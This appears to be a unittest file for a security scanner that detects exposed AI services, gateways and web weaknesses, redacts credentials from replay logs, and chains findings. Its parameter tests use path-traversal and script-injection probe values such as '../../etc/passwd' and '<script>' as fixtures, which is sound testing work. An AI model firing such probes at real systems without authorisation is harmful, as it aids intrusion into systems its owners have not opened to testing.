        for port, svc in ((7777, ""), (31337, "unknown"), (9443, ""),
                          (5000, "upnp"), (2375, "")):
            self.assertFalse(svc and svc in NON_HTTP_SERVICES,
                             "port %d would be skipped" % port)

    def test_definitively_non_http_services_are_skipped(self):
        from assay.engine import NON_HTTP_SERVICES
        for svc in ("ssh", "mysql", "postgresql", "domain", "smtp", "vnc"):
            self.assertIn(svc, NON_HTTP_SERVICES)

    def test_http_services_are_never_in_the_skip_list(self):
        from assay.engine import HTTP_SERVICES, NON_HTTP_SERVICES
        self.assertEqual(HTTP_SERVICES & NON_HTTP_SERVICES, set())


class GatewayThresholdTests(unittest.TestCase):
    def _wt(self, host, body, title=""):
        from assay.models import WebTarget
        w = WebTarget(url="https://%s/" % host, host=host, port=443,
                      scheme="https", status=200, server="nginx", title=title,
                      content_type="text/html")
        w.body_sample = body
        return w

    def test_asserted_mode_does_not_eat_a_two_node_pool(self):
        """Two identical real servers must not be mistaken for the gateway."""
        from assay import gateway
        pool = [self._wt("10.0.0.%d" % i, "<html>" + "Real app " * 40 + "</html>",
                         title="App") for i in (1, 2)]
        v = gateway.detect(pool, asserted=True)
        self.assertFalse(v.detected,
                         "a 2-node load-balanced pool was filtered as a gateway")

    def test_asserted_mode_still_catches_a_real_gateway(self):
        from assay import gateway
        proxy = "<html><title>Gateway</title><body>No route.</body></html>"
        web = [self._wt("10.0.0.%d" % i, proxy) for i in range(1, 9)]
        web.append(self._wt("10.0.0.90", "<html>" + "Real " * 60 + "</html>",
                            title="App"))
        v = gateway.detect(web, asserted=True)
        self.assertTrue(v.detected)
        self.assertEqual([w.host for w in gateway.filter_web(web, v)],
                         ["10.0.0.90"])

    def test_asserted_is_more_sensitive_than_inferred_but_still_needs_a_majority(self):
        from assay import gateway
        proxy = "<html><title>Gateway</title><body>No route.</body></html>"
        web = [self._wt("10.0.0.%d" % i, proxy) for i in (1, 2, 3)]
        web.append(self._wt("10.0.0.9", "<html>" + "Real " * 60 + "</html>"))
        self.assertFalse(gateway.detect(web).detected, "inferred needs 5")
        self.assertTrue(gateway.detect(web, asserted=True).detected,
                        "asserted should conclude at 3 of 4")


class AiSurfaceTests(unittest.TestCase):
    """AI infrastructure ships unauthenticated and is now widely deployed."""

    def _target(self, *ports):
        from assay.models import Port, Target
        t = Target(raw="10.0.0.5", host="10.0.0.5", ip="10.0.0.5")
        t.ports = [Port(port=p, service="") for p in ports]
        return t

    def test_ollama_is_detected_from_its_model_list(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([path_route(
            "/api/tags", ctype="application/json",
            body='{"models":[{"name":"llama3:8b","size":4661224676}]}')])
        found = AiSurfaceModule().run_host(ctx, self._target(11434))
        self.assertTrue(found, "exposed Ollama was missed")
        self.assertIn("Ollama", found[0].title)
        self.assertEqual(found[0].confidence, "confirmed")
        self.assertIn("Confidentiality", found[0].detail)

    def test_outdated_ollama_is_escalated_to_critical(self):
        """A version below the CVE-2026-7482 fix changes the severity."""
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([
            path_route("/api/tags", ctype="application/json",
                       body='{"models":[{"name":"llama3"}]}'),
            path_route("/api/version", ctype="application/json",
                       body='{"version":"0.16.4"}')])
        found = AiSurfaceModule().run_host(ctx, self._target(11434))
        self.assertEqual(found[0].severity, "critical")
        self.assertIn("CVE-2026-7482", found[0].impact)
        self.assertIn("cve-2026-7482", found[0].tags)

    def test_patched_ollama_stays_high_not_critical(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([
            path_route("/api/tags", ctype="application/json",
                       body='{"models":[{"name":"llama3"}]}'),
            path_route("/api/version", ctype="application/json",
                       body='{"version":"0.17.4"}')])
        found = AiSurfaceModule().run_host(ctx, self._target(11434))
        self.assertEqual(found[0].severity, "high")
        self.assertNotIn("CVE-2026-7482", found[0].impact)

    def test_vllm_openai_endpoint_detected(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([path_route(
            "/v1/models", ctype="application/json",
            body='{"object":"list","data":[{"id":"m","owned_by":"vllm"}]}')])
        found = AiSurfaceModule().run_host(ctx, self._target(8000))
        self.assertTrue(any("OpenAI-compatible" in f.title for f in found))

    def test_qdrant_detected(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([path_route(
            "/collections", ctype="application/json",
            body='{"result":{"collections":[{"name":"docs"}]},"status":"ok"}')])
        found = AiSurfaceModule().run_host(ctx, self._target(6333))
        self.assertTrue(any("Qdrant" in f.title for f in found))
        self.assertEqual(found[0].severity, "high")

    def test_ray_dashboard_is_critical(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([path_route(
            "/api/version", ctype="application/json",
            body='{"ray_version":"2.9.0","ray_commit":"abc"}')])
        found = AiSurfaceModule().run_host(ctx, self._target(8265))
        self.assertTrue(found)
        self.assertEqual(found[0].severity, "critical")

    def test_an_ordinary_web_app_on_a_shared_port_is_not_claimed(self):
        """Port 8000 is vLLM, ChromaDB, Triton and a thousand dev servers."""
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, _ = make_ctx([])   # catch-all HTML shell
        self.assertEqual(AiSurfaceModule().run_host(ctx, self._target(8000)), [])

    def test_closed_ports_are_not_probed(self):
        from assay.modules.ai_surface import AiSurfaceModule
        ctx, http = make_ctx([path_route(
            "/api/tags", ctype="application/json", body='{"models":[]}')])
        self.assertEqual(AiSurfaceModule().run_host(ctx, self._target(22)), [])

    def test_ai_ports_are_always_scanned(self):
        """11434 and 8265 are outside nmap's top-1000; a default scan misses them."""
        from assay.engine import AI_PORTS, Engine
        from assay.tools import nmap_port_args
        for profile_spec in ("top-100", "top-1000"):
            spec = Engine._with_ai_ports(profile_spec)
            args = " ".join(nmap_port_args(spec))
            for port in (11434, 8265, 6333):
                self.assertIn(str(port), args,
                              "port %d absent from %s" % (port, profile_spec))
        self.assertEqual(Engine._with_ai_ports("all"), "all",
                         "a full scan needs no additions")

    def test_service_ports_are_covered_by_discovery(self):
        from assay.engine import AI_PORTS, WEB_PORTS
        from assay.modules.ai_surface import load_services
        covered = set(AI_PORTS) | set(WEB_PORTS)
        missing = sorted({p for s in load_services() for p in s["ports"]} - covered)
        self.assertEqual(missing, [],
                         "these service ports would never be discovered: %s" % missing)

    def test_every_service_records_where_its_facts_came_from(self):
        """Ports and paths are easy to assert confidently and get wrong.

        Each signature carries provenance so a reader can tell a documented
        fact from a remembered one. Because matching is on content rather than
        port, a wrong value costs a missed detection, never a false positive.
        """
        from assay.modules.ai_surface import load_services
        missing = [s["name"] for s in load_services() if not s.get("verified")]
        self.assertEqual(missing, [],
                         "no provenance recorded for: %s" % missing)

    def test_no_signature_targets_a_post_only_endpoint(self):
        """A GET probe against a POST-only path can never fire.

        MLflow's experiments/search is POST-only and was written here as a GET,
        which is a silent gap rather than a visible failure.
        """
        from assay.modules.ai_surface import load_services
        post_only = ("experiments/search", "/query", "/search")
        offenders = [s["name"] for s in load_services()
                     if any(p in s["path"] for p in post_only)]
        self.assertEqual(offenders, [], "GET probe on a POST endpoint: %s" % offenders)

    def test_every_service_declares_impact_and_a_next_step(self):
        from assay.modules.ai_surface import load_services
        for s in load_services():
            self.assertTrue(s.get("impact"), "%s has no impact" % s["name"])
            self.assertTrue(s.get("step"), "%s has no repro step" % s["name"])
            self.assertTrue(s.get("cia"), "%s has no CIA mapping" % s["name"])
            self.assertTrue(s.get("match"), "%s would fire on a port alone" % s["name"])


class McpTests(unittest.TestCase):
    def _target(self, *ports):
        from assay.models import Port, Target
        t = Target(raw="10.0.0.6", host="10.0.0.6", ip="10.0.0.6")
        t.ports = [Port(port=p, service="") for p in ports]
        return t

    def test_mcp_handshake_is_detected(self):
        from assay.modules.ai_surface import McpModule

        def route(m, url, h, b):
            if m != "POST" or "initialize" not in (b or ""):
                return None
            return 200, {"Content-Type": "application/json"}, (
                '{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2025-06-18",'
                '"capabilities":{"tools":{},"resources":{}},'
                '"serverInfo":{"name":"filesystem-server","version":"1.0"}}}')
        ctx, _ = make_ctx([route])
        found = McpModule().run_host(ctx, self._target(3000))
        self.assertTrue(found, "MCP handshake was missed")
        self.assertEqual(found[0].severity, "critical")
        self.assertIn("tools", found[0].detail)
        self.assertIn("filesystem-server", found[0].detail)

    def test_a_plain_json_api_is_not_mcp(self):
        from assay.modules.ai_surface import McpModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "application/json"}, '{"status":"ok"}'
        ctx, _ = make_ctx([route])
        self.assertEqual(McpModule().run_host(ctx, self._target(3000)), [])

    def test_handshake_only_no_tool_is_ever_called(self):
        """Detection must not execute anything the server exposes."""
        from assay.modules.ai_surface import McpModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "application/json"}, (
                '{"result":{"protocolVersion":"2025-06-18","capabilities":{},'
                '"serverInfo":{"name":"s"}}}')
        ctx, http = make_ctx([route])
        McpModule().run_host(ctx, self._target(3000))
        bodies = [c for c in http.calls]
        self.assertTrue(all("tools/call" not in str(c) for c in bodies))


class JournalSecretTests(unittest.TestCase):
    """replay.sh is an executable file in the output folder.

    Writing engagement credentials into it is exactly the artefact you do not
    want left behind, so secret-bearing headers are referenced, never stored.
    """

    def _journal(self, headers):
        import tempfile
        from assay.journal import Journal
        j = Journal(tempfile.mkdtemp())
        j.open(["t"], "standard")
        j.request("GET", "https://target.tld/admin", headers)
        j.close()
        return j

    def test_basic_credentials_are_not_written_to_disk(self):
        from assay.config import Config
        cfg = Config(basic_auth="admin:hunter2")
        j = self._journal(cfg.request_headers())
        blob = open(j.replay_path).read() + open(j.log_path).read()
        self.assertNotIn("YWRtaW46aHVudGVyMg==", blob)
        self.assertNotIn("hunter2", blob)
        self.assertIn("${ASSAY_AUTH", open(j.replay_path).read())

    def test_cookies_and_api_keys_are_not_written(self):
        j = self._journal({"Cookie": "session=abc123secret",
                           "X-Api-Key": "live_key_9999"})
        blob = open(j.replay_path).read()
        self.assertNotIn("abc123secret", blob)
        self.assertNotIn("live_key_9999", blob)

    def test_ordinary_headers_are_still_recorded(self):
        """Redaction must not gut the replay's usefulness."""
        j = self._journal({"X-Trace": "ok", "Referer": "https://target.tld/"})
        blob = open(j.replay_path).read()
        self.assertIn("X-Trace: ok", blob)

    def test_journal_files_are_owner_only(self):
        import os, stat
        j = self._journal({"X-Trace": "ok"})
        self.assertEqual(stat.S_IMODE(os.stat(j.log_path).st_mode), 0o600)
        self.assertEqual(stat.S_IMODE(os.stat(j.replay_path).st_mode), 0o700)


class EmptyStateTests(unittest.TestCase):
    """Read commands on a folder that was never scanned.

    Store() creates the database if missing, so every read command used to
    produce an empty result and leave a stray assay.db behind.
    """

    def test_open_run_reports_missing_and_creates_nothing(self):
        import os, tempfile
        from assay.cli import open_run
        d = os.path.join(tempfile.mkdtemp(), "never")
        store, resolved = open_run(d)
        self.assertIsNone(store)
        self.assertFalse(os.path.exists(os.path.join(d, "assay.db")),
                         "a stray database was created")
        self.assertFalse(os.path.exists(d), "a stray folder was created")

    def test_open_run_finds_an_existing_run(self):
        import os, tempfile
        from assay.cli import open_run
        from assay.store import Store
        d = tempfile.mkdtemp()
        Store(os.path.join(d, "assay.db")).close()
        store, resolved = open_run(d)
        self.assertIsNotNone(store)
        store.close()

    def test_open_run_resolves_the_newest_engagement_subfolder(self):
        import os, tempfile, time
        from assay.cli import open_run
        from assay.store import Store
        root = tempfile.mkdtemp()
        for name in ("ALPHA", "BRAVO"):
            os.makedirs(os.path.join(root, name))
            Store(os.path.join(root, name, "assay.db")).close()
            time.sleep(0.01)
        store, resolved = open_run(root)
        self.assertIsNotNone(store)
        self.assertTrue(resolved.endswith("BRAVO"))
        store.close()


class ParamInferenceTests(unittest.TestCase):
    """Which checks a parameter earns, from its name and observed value."""

    def test_value_beats_name_when_unambiguous(self):
        from assay.params import classify
        self.assertEqual(classify("id", "https://a.tld"), "url")
        self.assertEqual(classify("id", "/etc/passwd"), "path")

    def test_a_redirect_name_survives_a_relative_value(self):
        """next=/dashboard is the most common shape of an open redirect.

        Reading it as a path means the redirect check never runs on it.
        """
        from assay.params import classify, targets_for
        self.assertEqual(classify("next", "/dashboard"), "url")
        self.assertEqual(
            targets_for("openredirect", "https://t/login?next=/dashboard"), ["next"])

    def test_a_boolean_name_with_a_non_boolean_value_is_not_a_flag(self):
        """debug=<script> is a reflection candidate, not a switch."""
        from assay.params import classify, targets_for
        self.assertEqual(classify("debug", "<script>"), "unknown")
        self.assertIn("debug",
                      targets_for("reflection", "https://t/x?debug=%3Cscript%3E"))
        self.assertEqual(classify("debug", "true"), "bool")

    def test_checks_are_routed_to_plausible_parameters_only(self):
        from assay.params import targets_for
        u = ("https://t/x?id=42&url=https://a.tld&file=../../etc/passwd"
             "&q=hi&debug=true")
        self.assertEqual(targets_for("ssrf", u), ["url"])
        self.assertEqual(targets_for("traversal", u), ["file"])
        self.assertEqual(targets_for("openredirect", u), ["url"])
        self.assertIn("id", targets_for("sqli", u))
        self.assertNotIn("url", targets_for("sqli", u))

    def test_unknown_parameters_still_get_every_check(self):
        """Inference narrows work when confident and gets out of the way."""
        from assay.params import targets_for
        u = "https://t/x?wibble=zzz"
        for check in ("sqli", "ssrf", "traversal", "reflection", "ssti"):
            self.assertEqual(targets_for(check, u), ["wibble"])

    def test_pagination_is_not_an_idor_candidate(self):
        from assay.params import idor_candidates
        got = [n for n, _v, _k in idor_candidates(
            "https://t/a?user_id=1004&page=2&offset=40&limit=10&invoice=889")]
        self.assertEqual(sorted(got), ["invoice", "user_id"])


class PrevalenceTests(unittest.TestCase):
    def _f(self, title, host, module, sev="info"):
        from assay.models import Evidence, Finding
        f = Finding(title=title, target="https://%s/" % host, module=module,
                    severity=sev, confidence="confirmed", impact="i",
                    evidence=[Evidence(kind="http", output="x")])
        f.compute_score()
        return f

    def test_a_finding_on_every_host_is_ranked_down(self):
        from assay.correlate import apply_prevalence, environmental
        fs = [self._f("Security headers absent", "h%d.t" % i, "headers")
              for i in range(8)]
        before = fs[0].score
        p = environmental(fs)
        self.assertIn("Security headers absent", p)
        apply_prevalence(fs, p)
        self.assertLess(fs[0].score, before)
        self.assertIn("environmental", fs[0].tags)
        self.assertIn("environment", fs[0].notes)

    def test_a_small_scope_is_never_collapsed(self):
        """Three of four is a small sample, not an estate-wide policy."""
        from assay.correlate import environmental
        fs = [self._f("Security headers absent", "h%d.t" % i, "headers")
              for i in range(3)]
        self.assertEqual(environmental(fs), {})

    def test_a_finding_on_one_host_is_untouched(self):
        from assay.correlate import apply_prevalence, environmental
        fs = [self._f("Security headers absent", "h%d.t" % i, "headers")
              for i in range(8)]
        rare = self._f("Exposed .env file", "h3.t", "exposure", "critical")
        fs.append(rare)
        before = rare.score
        apply_prevalence(fs, environmental(fs))
        self.assertEqual(rare.score, before)
        self.assertNotIn("environmental", rare.tags)


class ChainTests(unittest.TestCase):
    def _f(self, title, target, module, sev="medium", detail=""):
        from assay.models import Evidence, Finding
        f = Finding(title=title, target=target, module=module, severity=sev,
                    confidence="confirmed", impact="i", detail=detail,
                    evidence=[Evidence(kind="http", output="x")])
        f.compute_score()
        return f

    def test_cors_sibling_plus_takeover_on_the_same_apex(self):
        from assay.correlate import chains
        fs = [self._f("CORS trusts any subdomain of the parent domain",
                      "https://api.acme.tld/v1/me", "cors"),
              self._f("Subdomain takeover: dangling CNAME to Heroku",
                      "dead.acme.tld", "takeover", "high")]
        got = chains(fs)
        self.assertTrue(any("Subdomain takeover into" in c.name for c in got))
        self.assertEqual(got[0].severity, "critical")

    def test_no_chain_when_the_apex_differs(self):
        """A takeover on someone else's domain does not chain."""
        from assay.correlate import chains
        fs = [self._f("CORS trusts any subdomain of the parent domain",
                      "https://api.acme.tld/v1/me", "cors"),
              self._f("Subdomain takeover: dangling CNAME to Heroku",
                      "dead.other.tld", "takeover", "high")]
        self.assertFalse(any("Subdomain takeover into" in c.name
                             for c in chains(fs)))

    def test_reflection_plus_missing_csp_on_the_same_host(self):
        from assay.correlate import chains
        fs = [self._f("Input reflected into HTML with tag characters unencoded",
                      "https://app.t/s", "reflection", "high"),
              self._f("Security headers absent", "https://app.t/", "headers",
                      "info", detail="Missing: Content-Security-Policy")]
        self.assertTrue(any("no Content-Security-Policy" in c.name
                            for c in chains(fs)))

    def test_reflection_and_csp_on_different_hosts_do_not_chain(self):
        from assay.correlate import chains
        fs = [self._f("Input reflected into HTML with tag characters unencoded",
                      "https://app.t/s", "reflection", "high"),
              self._f("Security headers absent", "https://other.t/", "headers",
                      "info", detail="Missing: Content-Security-Policy")]
        self.assertFalse(any("no Content-Security-Policy" in c.name
                             for c in chains(fs)))

    def test_an_empty_finding_set_produces_no_chains(self):
        from assay.correlate import chains
        self.assertEqual(chains([]), [])

    def test_chains_are_ordered_strongest_first(self):
        from assay.correlate import chains
        fs = [self._f("Open redirect via 'redirect_uri' parameter",
                      "https://sso.t/oauth/authorize?redirect_uri=x",
                      "openredirect"),
              self._f("Exposed .env file", "https://p.t/.env", "exposure",
                      "critical")]
        got = chains(fs)
        self.assertTrue(got)
        order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        self.assertEqual([order[c.severity] for c in got],
                         sorted(order[c.severity] for c in got))


class IdorInventoryTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def test_object_references_are_collected_and_deduplicated(self):
        from assay.modules.web_idor import IdorInventoryModule
        urls = [self.ORIGIN + "/api/orders/view?order_id=8891",
                self.ORIGIN + "/api/orders/view?order_id=8892",
                self.ORIGIN + "/account/profile?user_id=1004",
                self.ORIGIN + "/search?q=hello&page=2",
                self.ORIGIN + "/static/app.js?v=3"]
        ctx, _ = make_ctx([], urls={self.ORIGIN: urls})
        found = IdorInventoryModule().run_web(ctx, web_target())
        self.assertTrue(found)
        body = found[0].evidence[0].output
        self.assertIn("order_id", body)
        self.assertIn("user_id", body)
        self.assertNotIn("page=", body, "pagination is not an object reference")
        self.assertEqual(body.count("/api/orders/view"), 1, "not deduplicated")

    def test_nothing_reported_when_there_are_no_object_references(self):
        from assay.modules.web_idor import IdorInventoryModule
        ctx, _ = make_ctx([], urls={self.ORIGIN: [self.ORIGIN + "/search?q=hi"]})
        self.assertEqual(IdorInventoryModule().run_web(ctx, web_target()), [])


if __name__ == "__main__":
    unittest.main(verbosity=2)
